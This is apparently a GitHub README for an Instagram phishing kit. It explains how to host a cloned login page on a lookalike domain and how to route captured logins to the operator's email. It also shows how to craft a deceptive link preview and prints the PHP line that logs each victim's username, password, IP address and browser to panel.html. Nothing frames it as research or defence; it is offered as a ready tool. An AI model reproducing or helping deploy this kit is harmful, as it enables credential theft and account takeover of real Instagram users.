# Instagram Phishing Website

Mobile compatible phishing site created by copying Instagram login page

## Getting Started

Buy a domain name similar to instagram.com. You can use freenoom to get a free domain name. And get a space to host your site.

### Installing

Edit the login.php file with the code below

```
$to = "youremail@here.com";
```

```
$title .= 'To: NAME youremail@here.com>' . "\r\n";
```

```
$title .= 'From: NAME <youremail@here.com>' . "\r\n";
```

Optionally, you can change the page here to be redirected after user login.

```
header('Location: https://www.instagram.com/accounts/privacy_and_security/');
```

## Link Preview Modification

You can edit the metadata in the index.html file. So the user sees a preview picture and text before clicking.

### Image

```
<meta property="og:image" content="index_files/meta.jpg">
```
### Text

```
<meta content="Bir hesap oluştur veya Instagram'a giriş yap - Fotoğraf ve videolar çekip düzenlemenin, bu fotoğrafları, videoları ve mesajları arkadaşlarınla ve akrabalarınla ..." name="description">
```

## Important notes

The application works with phpmailer. Make sure that this feature is enabled on your server before using it.

The .htaccess file provides ssl to your domain to increase reliability. If you don't want it, remove the file.

If you do not want the user information to be accessible on the website, delete the code below from the login.php file.

```
file_put_contents("panel.html", "<br><br><b>-------NEW USER DETECTED------</b>  "."<br><b>[DATE]</b>  " . strftime('%e %B %Y %A %H:%M:%S') .'<br><b>[EMAIL]:</b>  ' . $_POST['username'] . "<br><b>[PASS]:</b>  " . $_POST['password'] . "<br><b>[IP]:</b>  " . $_SERVER['REMOTE_ADDR'] ."<br><b>[HOST]:</b>  " . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "<br><b>[BROWSER]:</b>  " . $_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
```

Or you can change the name of the html file in the code section instead.


## Usage

User information is registered in the panel.html file. At the same time, a mail is sent to your email address.
It's that easy :)

## Features

* User ip address
* User internet service provider
* User device information
* And username and password information

can sent

### Demo

You can examine it from the link below but php functions do not work because it works on github pages.

<a href="https://codersamet.github.io/Instagram-Phishing/">Demo Website</a>

## Author

* **Samet Zengin** - *Software Developer* - [Personal Website](https://sametzengin.com.tr)

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details


